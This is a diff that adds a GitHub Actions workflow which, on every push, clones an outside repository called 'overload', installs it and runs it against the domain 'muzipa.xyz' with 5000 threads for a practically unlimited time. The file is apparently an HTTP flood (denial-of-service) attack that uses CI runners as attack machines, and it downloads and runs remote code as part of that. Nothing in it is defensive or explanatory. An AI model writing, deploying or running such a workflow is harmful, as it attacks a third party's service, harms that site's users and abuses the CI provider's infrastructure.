@@ -1,0 +1,14 @@
+name: main4
+on: [push]
+jobs:
+  mainv3:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - uses: actions/setup-python@v2
+        with:
+          python-version: '3.x'
+          architecture: 'x64'
+      - run: git clone https://github.com/7zx/overload
+      - run: pip3 install -r ./overload/requirements.txt
+      - run: python3 ./overload/overload.py --target muzipa.xyz --method HTTP --thread 5000 --time 9999999999999
